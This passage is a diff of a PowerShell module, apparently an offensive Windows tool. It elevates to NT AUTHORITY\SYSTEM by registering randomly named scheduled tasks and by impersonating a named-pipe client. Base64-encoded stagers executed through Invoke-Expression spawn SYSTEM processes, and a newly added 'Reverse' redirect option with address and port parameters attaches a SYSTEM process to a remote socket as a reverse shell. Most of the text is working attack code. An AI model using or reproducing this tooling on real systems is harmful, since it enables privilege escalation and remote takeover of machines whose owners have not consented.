+                ))
+                {
+                    throw [WinAPIException]::New("CreateProcessAsUser")
+                }
+
+                # Read Process Information
+                $processId = [System.Runtime.InteropServices.Marshal]::ReadInt32(
+                    $pPROCESS_INFORMATION,
+                    $PROCESS_INFORMATION_dwProcessId
+                )
+
+                $hProcess = [System.Runtime.InteropServices.Marshal]::ReadIntPtr(
+                    $pPROCESS_INFORMATION,
+                    0x0
+                )
+
+                $hThread = [System.Runtime.InteropServices.Marshal]::ReadIntPtr(
+                    $pPROCESS_INFORMATION,
+                    $PROCESS_INFORMATION_hThread
+                )
+
+                # Close returned handles, it is recommended by Microsoft documentation
+                $null = [Kernel32]::CloseHandle($hThread)
+                $null = [Kernel32]::CloseHandle($hProcess)
+
+                if ($processId -gt -1 -and $redirectFd)
+                {
+                    Wait-Process -Id $processId
+
+                    Close-NativeSocket -Socket $socket
+                }
+
+                return $processId
+            }
+            finally
+            {
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pSTARTUPINFO)
+                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pPROCESS_INFORMATION)
+            }
+        }
+        catch
+        {
+            return -1
+        }
+        finally
+        {
+            if ($newToken -ne [IntPtr]::Zero)
+            {
+                $null = [Kernel32]::CloseHandle($newToken)
+            }
         }
     }
-    catch
-    {
-        # Uncomment for debug
-        # ([string]::Format("$_ LastError:{0}", [Runtime.InteropServices.Marshal]::GetLastWin32Error().ToString())) | Out-File "c:\temp\error.log"
-    } 
-    finally
-    {
-        <#
-            if ($token -ne [IntPtr]::Zero)
-            {
-                [Kernel32]::CloseHandle($token)
-            }
-        #>
+}
 
-        if ($newToken -ne [IntPtr]::Zero)
+# ----------------------------------------------------------------------------------- #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+#  Classes                                                                            #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+# ----------------------------------------------------------------------------------- #
+
+$WinAPIException_ScriptBlock = {
+    class WinAPIException: System.Exception {
+        WinAPIException([string] $ApiName) : base (
+            [string]::Format(
+                "WinApi Exception -> {0}, LastError: {1}",
+                $ApiName,
+                [System.Runtime.InteropServices.Marshal]::GetLastWin32Error().ToString()
+            )
+        )
+        {}
+    }
+}
+. $WinAPIException_ScriptBlock
+
+# ----------------------------------------------------------------------------------- #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+#  Internal Functions                                                                 #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+# ----------------------------------------------------------------------------------- #
+
+$InvokeZeroMemory_ScriptBlock = {
+    function Invoke-ZeroMemory
+    {
+        param(
+            [IntPtr] $MemoryOffset,
+            [int] $Size
+        )
+
+        for ($i = 0; $i -lt $Size; $i++)
         {
-            $null = [Kernel32]::CloseHandle($newToken)
+            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryOffset, $i, 0x0)
         }
-    }       
+    }
+}
+. $InvokeZeroMemory_ScriptBlock
+
+function Test-SystemImpersonation
+{
+    <#
+        .SYNOPSIS
+            Check if current user is correctly impersonating SYSTEM user.
+                - ImpersonationLevel: Impersonate
+                - IsSystem: True
+    #>
+    $isSystem = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
+    $impersonationLevel = [System.Security.Principal.WindowsIdentity]::GetCurrent().ImpersonationLevel
+
+    return ($impersonationLevel -eq [System.Management.ImpersonationLevel]::Impersonate) -and $isSystem
 }
 
 function Test-Administrator
 {
     <#
         .SYNOPSIS
-            Check if current user is administrator.
+            Check if current user has administrator privilege. This privilege is required to register a
+            SYSTEM user scheduled task.
     #>
     $windowsPrincipal = New-Object Security.Principal.WindowsPrincipal(
         [Security.Principal.WindowsIdentity]::GetCurrent()
     )
-    
+
     return $windowsPrincipal.IsInRole(
         [Security.Principal.WindowsBuiltInRole]::Administrator
-    )    
+    )
 }
 
 function Test-AdministratorOrRaise
 {
     <#
         .SYNOPSIS
-            Check if current user is administrator, if not it will raise an exception.
+            Call `Test-Administrator` and raise an exception if the user is not an administrator.
     #>
     if (-not (Test-Administrator))
     {
@@ -479,39 +746,169 @@ function Get-RandomString
     return -join ((1..15) | ForEach-Object { Get-Random -Input $charList.ToCharArray() })
 }
 
+function Set-CurrentProcessPrivilege
+{
+    <#
+        .SYNOPSIS
+            Adjust current process privilege.
+    #>
+    param(
+        [Parameter(Mandatory=$True)]
+        $PrivilegeName,
+
+        [bool] $Enable = $true
+    )
+
+    $luid = 0
+
+    $result = [ADVAPI32]::LookupPrivilegeValue(
+        [IntPtr]::Zero,
+        $PrivilegeName,
+        [ref] $luid
+    )
+    if (-not $result)
+    {
+        throw [WinAPIException]::New("LookupPrivilegeValue")
+    }
+
+    $SE_PRIVILEGE_ENABLED = 0x2
+
+    if ($Enable)
+    {
+        $attr = $SE_PRIVILEGE_ENABLED
+    }
+    else
+    {
+        $attr = 0x0
+    }
+
+    if ([Environment]::Is64BitProcess)
+    {
+        # TokenPrivilege Structure x64
+        $tokenPrivilege_structSize = 0x18
+        $tokenPrivilege_LuidOffset = 0x8
+        $tokenPrivilege_AttributesOffset = 0x10
+    }
+    else
+    {
+        # TokenPrivilege Structure x32
+        $tokenPrivilege_structSize = 0x10
+        $tokenPrivilege_LuidOffset = 0x4
+        $tokenPrivilege_AttributesOffset = 0xC
+    }
+
+    $tokenPrivilege = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tokenPrivilege_structSize)
+    try
+    {
+        Invoke-ZeroMemory -MemoryOffset $tokenPrivilege -Size $tokenPrivilege_structSize
+
+        [System.Runtime.InteropServices.Marshal]::WriteInt32(
+            $tokenPrivilege,
+            0,
+            1
+        )
+
+        [System.Runtime.InteropServices.Marshal]::WriteInt64(
+            $tokenPrivilege,
+            $tokenPrivilege_LuidOffset,
+            $luid
+        )
+
+        [System.Runtime.InteropServices.Marshal]::WriteInt32(
+            $tokenPrivilege,
+            $tokenPrivilege_AttributesOffset,
+            $attr
+        )
+
+        $result = [ADVAPI32]::AdjustTokenPrivileges(
+            [Security.Principal.WindowsIdentity]::GetCurrent().Token,
+            $false,
+            $tokenPrivilege,
+            0,
+            [IntPtr]::Zero,
+            [IntPtr]::Zero
+        )
+        if (-not $result)
+        {
+            throw [WinAPIException]::New("AdjustTokenPrivileges")
+        }
+    }
+    finally
+    {
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tokenPrivilege)
+    }
+
+    return ([System.Runtime.InteropServices.Marshal]::GetLastWin32Error() -eq 0)
+}
+
+function Write-CurrentUser
+{
+    <#
+        .SYNOPSIS
+            Write the current user information to the console.
+
+        .DESCRIPTION
+            This function will write the current user name and token to the console.
+            If the current user is the result of an impersonation, it will display "Impersonated" next to the user name.
+    #>
+    Write-Host "Current User: " -NoNewLine
+    Write-Host ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -ForegroundColor Green -NoNewLine
+    Write-Host " (" -NoNewLine
+    Write-Host ([Security.Principal.WindowsIdentity]::GetCurrent().Token) -NoNewLine -ForegroundColor Cyan
+
+
+    if (Test-SystemImpersonation)
+    {
+        Write-Host " - Impersonated" -NoNewLine
+    }
+
+    Write-Host ")"
+}
+
+# ----------------------------------------------------------------------------------- #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+#  Exported Functions                                                                 #
+#                                                                                     #
+#                                                                                     #
+#                                                                                     #
+# ----------------------------------------------------------------------------------- #
+
 function Invoke-SystemCommand
 {
     <#
         .SYNOPSIS
-            Execute program as NT AUTHORITY/SYSTEM with optional arguments.        
+            Execute an application as SYSTEM user with the specified argument(s).
 
-        .PARAMETER Execute
+        .DESCRIPTION
+            Impersonation is not required for this function. It exclusively relies on Task Scheduler to execute action.
+
+            It is important to note that executed application will run in the background and will not be visible to the user.
+            (Non-interactive)
+
+        .PARAMETER Application
             Program to execute as System.
 
         .PARAMETER Argument
-            Optional argument(s) to pass to program to execute. 
+            Optional argument(s) to pass to program to execute.
     #>
     param(
-        [string] $Execute = "powershell.exe",
+        [string] $Application = "powershell.exe",
         [string] $Argument = "-Command ""whoami | Out-File C:\result.txt"""
     )
 
     Test-AdministratorOrRaise
 
-    if (Test-Impersonating)
-    {
-        throw "Could use this function while impersonating user."
-    }
-
     $taskName = Get-RandomString
-    
+
     if ($Argument)
     {
-        $action = New-ScheduledTaskAction -Execute $Execute -Argument $Argument
+        $action = New-ScheduledTaskAction -Execute $Application -Argument $Argument
     }
     else
     {
-        $action = New-ScheduledTaskAction -Execute $Execute
+        $action = New-ScheduledTaskAction -Execute $Application
     }
 
     $null = Register-ScheduledTask -Force -Action $action -TaskName $taskName -User "NT AUTHORITY\SYSTEM"
@@ -525,21 +922,30 @@ function Invoke-SystemCommand
     }
 }
 
-function Invoke-InteractiveSystemPowerShell
+function Invoke-InteractiveSystemProcess
 {
     <#
         .SYNOPSIS
-            Spawn a SYSTEM process in Active Microsoft Windows Session.   
+            Spawn a SYSTEM process in Active Microsoft Windows Session.
     #>
+    param (
+        [string] $CommandLine = "powershell.exe",
+        [switch] $Hide,
 
-    if (Test-Impersonating)
-    {
-        throw "Could use this function while impersonating user."
-    }
+        [ValidateSet("None", "Reverse")]
+        [string] $RedirectKind = "None",
 
-    $secondStageBlock = { 
+        # Depending on the RedirectKind, the following parameter is whether the address of remote server
+        # or the interface to bind to.
+        [string] $Address,
+
+        [ValidateRange(1, 65535)]
+        [int] $Port
+    )
+
+    $stager_ScriptBlock = {
         try
-        {        
+        {
             $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", "PIPENAME", [System.IO.Pipes.PipeDirection]::In)
 
             $pipeClient.Connect(5 * 1000)
@@ -548,7 +954,7 @@ function Invoke-InteractiveSystemPowerShell
 
             $nextStage = $reader.ReadLine()
 
-            Invoke-Expression([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($nextStage)))            
+            Invoke-Expression([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($nextStage)))
         }
         finally
         {
@@ -560,23 +966,17 @@ function Invoke-InteractiveSystemPowerShell
             if ($pipeClient)
             {
                 $pipeClient.Dispose()
-            }            
-        }        
+            }
+        }
     }
 
     $pipeName = Get-RandomString
 
     $encodedBlock =  [Convert]::ToBase64String(
         [System.Text.Encoding]::ASCII.GetBytes(
-            ([string]$secondStageBlock).replace('PIPENAME', $pipeName)
+            ($stager_ScriptBlock.ToString()).replace('PIPENAME', $pipeName)
         )
-    )    
-
-    # If using bellow technique, replace ::ASCII by ::Unicode above.
-    #$command = [string]::Format(
-    #    "-NoProfile -EncodedCommand {0}""", 
-    #    $encodedBlock
-    #)
+    )
 
     $command = [string]::Format(
         "Invoke-Expression([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{0}')))",
@@ -594,7 +994,43 @@ function Invoke-InteractiveSystemPowerShell
         $writer = New-Object System.IO.StreamWriter($pipeServer)
         $writer.AutoFlush = $true
 
-        $writer.WriteLine([Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(([string]$global:InvokeInteractiveProcessScriptBlock))))
+        # Prepare optional arguments
+        $optionalArgs = @()
+
+        if ($Hide)
+        {
+            $optionalArgs += "-Hide"
+        }
+
+        if ($RedirectKind -ne "None")
+        {
+            $optionalArgs += "-RedirectKind $RedirectKind"
+
+            if ($Address)
+            {
+                $optionalArgs += "-Address $Address"
+            }
+
+            if ($Port)
+            {
+                $optionalArgs += "-Port $Port"
+            }
+        }
+
+        # Create our final payload that will be executed in the context of the SYSTEM user
+        $payload = $InvokeInteractiveProcess_ScriptBlock.ToString() +
+            $WinAPIException_ScriptBlock.ToString() +
+            $InvokeZeroMemory_ScriptBlock.ToString() +
+            [string]::Format(
+                "Invoke-InteractiveSystemProcess -CommandLine ""{0}"" {1}",
+                $CommandLine,
+                # Forward optional arguments
+                ($optionalArgs -join " ")
+            )
+
+        $encoded_payload = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($payload))
+
+        $writer.WriteLine($encoded_payload)
     }
     finally
     {
@@ -610,125 +1046,6 @@ function Invoke-InteractiveSystemPowerShell
     }
 }
 
-function Set-CurrentProcessPrivilege
-{
-    <#
-        .SYNOPSIS
-            Ajust current process privilege.
-
-        .PARAMETER PrivilegeName
-            Type: String
-            Default: None
-            Description: The name of the privilege to adjust.
-
-        .PARAMETER Enable
-            Type: Boolean
-            Default: True
-            Description:
-                True: Enable privilege
-                False: Disable privilege
-    #>
-    param(
-        [Parameter(Mandatory=$True)]
-        $PrivilegeName,
-
-        [bool] $Enable = $true
-    )
-    
-    try
-    {        
-        # Grab current process token using WinAPI (Commented)
-        <#
-            $curToken = [IntPtr]::Zero
-            $TOKEN_ADJUST_PRIVILEGES = 0x20 
-            $TOKEN_QUERY = 0x8
-
-            $result = [ADVAPI32]::OpenProcessToken(
-                [System.Diagnostics.Process]::GetCurrentProcess().Handle,
-                $TOKEN_ADJUST_PRIVILEGES -bor $TOKEN_QUERY,
-                [ref] $curToken
-            )
-            if (-not $result)
-            {
-                throw "OpenProcessToken"
-            }
-        #>       
-
-        [long] $luid = 0
-
-        $result = [ADVAPI32]::LookupPrivilegeValue(
-            [IntPtr]::Zero,
-            $PrivilegeName,
-            [ref] $luid
-        )
-        if (-not $result)
-        {
-            throw [WinAPIException]::New("LookupPrivilegeValue")
-        }     
-
-        $SE_PRIVILEGE_ENABLED = 0x2
-
-        if ($Enable)
-        {
-            $attr = $SE_PRIVILEGE_ENABLED
-        }
-        else
-        {
-            $attr = 0x0
-        }
-
-        $tokenPrivilege = [TokenPrivilege]::New()
-        $tokenPrivilege.PrivilegeCount = 1        
-        $tokenPrivilege.Luid = $luid   
-        $tokenPrivilege.Attributes = $attr        
-
-        $result = [ADVAPI32]::AdjustTokenPrivileges(
-            [Security.Principal.WindowsIdentity]::GetCurrent().Token,
-            $false,
-            [ref] $tokenPrivilege,
-            0,
-            [IntPtr]::Zero,
-            [IntPtr]::Zero
-        )
-        if (-not $result)
-        {            
-            throw [WinAPIException]::New("AdjustTokenPrivileges")
-        }
-
-        return ([System.Runtime.InteropServices.Marshal]::GetLastWin32Error() -eq 0)
-    }    
-    finally
-    {
-        # Release Token Handle if grabbind current process token using WinAPI
-        <#
-            if ($curToken -ne [IntPtr]::Zero)
-            {
-                $null = [Kernel32]::CloseHandle($curToken)
-            }
-        #>
-    }
-}
-
-function Write-CurrentUser
-{
-    <#
-        .SYNOPSIS
-            Output current username to terminal.
-    #>
-    Write-Host "Current User: " -NoNewLine
-    Write-Host ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -ForegroundColor Green -NoNewLine
-    Write-Host " (" -NoNewLine
-    Write-Host ([Security.Principal.WindowsIdentity]::GetCurrent().Token) -NoNewLine -ForegroundColor Cyan
-    
-
-    if (Test-Impersonating)
-    {
-        Write-Host " - Impersonated" -NoNewLine
-    }
-
-    Write-Host ")"
-}
-
 function Invoke-ImpersonateSystem
 {
     <#
@@ -742,19 +1059,19 @@ function Invoke-ImpersonateSystem
     #>
     Test-AdministratorOrRaise
 
-    if (Test-Impersonating)
+    if (Test-SystemImpersonation)
     {
-        throw "You are already impersonating a user."
+        throw "You are already impersonating SYSTEM user. Use `Invoke-RevertToSelf` to stop impersonation."
     }
 
-    $script = {
+    $stager_ScriptBlock = {
         try
         {
             $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream(".", "PIPENAME", [System.IO.Pipes.PipeDirection]::Out)
 
             $pipeClient.Connect(10 * 1000)
 
-            $writer = New-Object System.IO.StreamWriter($pipeClient)            
+            $writer = New-Object System.IO.StreamWriter($pipeClient)
             $writer.AutoFlush = $true
 
             $writer.Write("A")
@@ -770,30 +1087,29 @@ function Invoke-ImpersonateSystem
             {
                 $pipeClient.Dispose()
             }
-        }        
+        }
     }
 
-    # Just in case it is not already.
     try
     {
         $null = Set-CurrentProcessPrivilege -PrivilegeName "SeImpersonatePrivilege"
     }
     catch
     {}
-    
+
     try
     {
         Write-CurrentUser
 
         $pipeName = Get-RandomString
 
-        $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::In)        
+        $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream($pipeName, [System.IO.Pipes.PipeDirection]::In)
 
         $encodedBlock =  [Convert]::ToBase64String(
             [System.Text.Encoding]::ASCII.GetBytes(
-                ([string]$script).replace('PIPENAME', $pipeName)
+                ([string]$stager_ScriptBlock).replace('PIPENAME', $pipeName)
             )
-        )    
+        )
 
         $command = [string]::Format(
             "Invoke-Expression([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{0}')))",
@@ -808,12 +1124,19 @@ function Invoke-ImpersonateSystem
 
         $null = $reader.Read()
 
-        $pipeHandle = $pipeServer.SafePipeHandle.DangerousGetHandle()        
+        $pipeHandle = $pipeServer.SafePipeHandle.DangerousGetHandle()
 
         if (-not [ADVAPI32]::ImpersonateNamedPipeClient($pipeHandle))
         {
             throw [WinAPIException]::New("ImpersonateNamedPipeClient")
-        }    
+        }
+
+        if (-not (Test-SystemImpersonation))
+        {
+            throw "Failed to impersonate SYSTEM user."
+        }
+
+        Write-Host "SYSTEM User Impersonation Successful."
 
         Write-CurrentUser
     }
@@ -827,83 +1150,7 @@ function Invoke-ImpersonateSystem
         if ($pipeServer)
         {
             $pipeServer.Dispose()
-        }    
-    }
-}
-
-function Invoke-ImpersonatedProcess
-{
-    <#
-        .SYNOPSIS
-            Invoke a new process as Impersonated User.
-
-        .DESCRIPTION
-            Requires current thread to impersonate a user.
-
-        .PARAMETER CommandLine
-            Type: String
-            Default: PowerShell.exe
-            Description: The command line to run as impersonated user.
-    #>
-    param(
-        [string] $CommandLine = "powershell.exe"
-    )
-
-    if (-not (Test-Impersonating))
-    {
-        throw "You must first impersonate a user."
-    }
-
-    $STARTF_USESHOWWINDOW = 0x1
-    $STARTF_USESTDHANDLES = 0x100
-    $SW_SHOW = 0x5
-
-    if ([Environment]::Is64BitProcess)
-    {
-        $structSize = 0x68
-        $structOffset_dwFlags = 0x3c
-        $structOffset_wShowWindow = 0x40            
-    }
-    else
-    {
-        $structSize = 0x44
-        $structOffset_dwFlags = 0x2c
-        $structOffset_wShowWindow = 0x30            
-    }
-
-    $pSTARTUPINFO = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($structSize)
-    try
-    {
-        # ZeroMemory
-        for ($i = 0; $i -lt $structSize; $i++)
-        {
-            [System.Runtime.InteropServices.Marshal]::WriteByte($pSTARTUPINFO, $i, 0x0)    
-        }                   
-
-        [System.Runtime.InteropServices.Marshal]::WriteInt32($pSTARTUPINFO, 0x0, $structSize) # cb
-        [System.Runtime.InteropServices.Marshal]::WriteInt32($pSTARTUPINFO, $structOffset_dwFlags, $STARTF_USESHOWWINDOW -bor $STARTF_USESTDHANDLES) # dwFlags
-        [System.Runtime.InteropServices.Marshal]::WriteInt16($pSTARTUPINFO, $structOffset_wShowWindow, $SW_SHOW) # wShowWindow        
-    
-        $processInfo = [IntPtr]::Zero                        
-
-        if (-not [ADVAPI32]::CreateProcessWithToken(
-            [IntPtr]([Security.Principal.WindowsIdentity]::GetCurrent().Token),
-            0x0,
-            [IntPtr]::Zero,
-            $CommandLine,                
-            0x0,
-            [IntPtr]::Zero,
-            [IntPtr]::Zero,
-            $pSTARTUPINFO,
-            [ref]$processInfo
-        ))
-        {
-            throw [WinAPIException]::New("CreateProcessWithToken")
-        }  
-    }
-    finally
-    {
-        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pSTARTUPINFO)
+        }
     }
 }
 
@@ -914,23 +1161,25 @@ function Invoke-RevertToSelf
             Stop impersonating user.
     #>
 
-    if (-not (Test-Impersonating))
+    if (-not (Test-SystemImpersonation))
     {
-        throw "You are currently not impersonating a user."
+        throw "You are not impersonating SYSTEM user."
     }
 
-    Write-CurrentUser
+    Write-Host "Stop impersonating user..."
 
-    Write-Host ([string]::Format("Result: {0}", [ADVAPI32]::RevertToSelf()))
+    if (-not [ADVAPI32]::RevertToSelf())
+    {
+        throw [WinAPIException]::New("RevertToSelf")
+    }
 
+    Write-Host "Impersonation Stopped."
     Write-CurrentUser
 }
 
-try {  
+try {
     Export-ModuleMember -Function Invoke-SystemCommand
-    Export-ModuleMember -Function Invoke-InteractiveSystemPowerShell
-    Export-ModuleMember -Function Set-CurrentProcessPrivilege
+    Export-ModuleMember -Function Invoke-InteractiveSystemProcess
     Export-ModuleMember -Function Invoke-ImpersonateSystem
-    Export-ModuleMember -Function Invoke-ImpersonatedProcess
     Export-ModuleMember -Function Invoke-RevertToSelf
 } catch {}
